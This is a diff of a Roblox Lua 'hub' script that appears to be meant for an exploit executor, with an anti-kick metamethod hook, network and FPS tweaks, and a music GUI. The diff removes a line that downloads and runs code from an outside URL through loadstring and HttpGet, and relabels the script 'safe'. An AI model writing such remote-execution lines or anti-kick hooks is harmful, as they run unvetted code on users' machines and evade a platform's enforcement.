@@ -1,5 +1,5 @@
 --============================================================
--- VOID HUB - LIGHT EDITION (ANTI-KICK + FPS/PING BOOST + DUAL MUSIC)
+-- VOID HUB - LIGHT EDITION (STABLE & SAFE)
 --============================================================
 
 local Players = game:GetService("Players")
@@ -37,11 +37,10 @@ if hookmetamethod then
 end
 
 --============================================================
--- 2. PING BOOSTER & FPS OPTIMIZER (تقليل البينج واللاج)
+-- 2. PING BOOSTER & FPS OPTIMIZER
 --============================================================
 
 pcall(function()
-	-- FPS Optimization
 	Lighting.GlobalShadows = false
 	Lighting.FogEnd = 9e9
 	settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
@@ -58,7 +57,6 @@ pcall(function()
 	end
 end)
 
--- Network & Ping Optimization
 pcall(function()
 	settings().Network.IncomingReplicationLag = -1000
 	if NetworkClient then
@@ -67,7 +65,7 @@ pcall(function()
 end)
 
 --============================================================
--- 3. RUN EXTERNAL SCRIPTS
+-- 3. RUN EXTERNAL SCRIPT (السكريبت الآمن والأساسي فقط)
 --============================================================
 
 task.spawn(function()
@@ -76,14 +74,8 @@ task.spawn(function()
 	end)
 end)
 
-task.spawn(function()
-	pcall(function()
-		loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=dcon25o8"))()
-	end)
-end)
-
 --============================================================
--- 4. DUAL MUSIC PLAYER GUI (قائمة الموسيقى المزدوجة)
+-- 4. DUAL MUSIC PLAYER GUI
 --============================================================
 
 local oldGui = PlayerGui:FindFirstChild("VoidHubMusicGui")
@@ -182,13 +174,13 @@ local pingLabel = Instance.new("TextLabel")
 pingLabel.Size = UDim2.new(1, 0, 0, 20)
 pingLabel.Position = UDim2.new(0, 0, 0.82, 0)
 pingLabel.BackgroundTransparency = 1
-pingLabel.Text = "⚡ PING BOOST ACTIVE"
+pingLabel.Text = "⚡ PING & FPS BOOST ACTIVE"
 pingLabel.TextColor3 = Color3.fromRGB(0, 255, 120)
 pingLabel.Font = Enum.Font.GothamBold
 pingLabel.TextSize = 10
 pingLabel.Parent = frame
 
--- تحميل الصوت الخفيف والآمن بدون تعليق
+-- تحميل الصوت
 local function loadAudioTrack(trackIdx)
 	if soundInstance then
 		soundInstance:Stop()
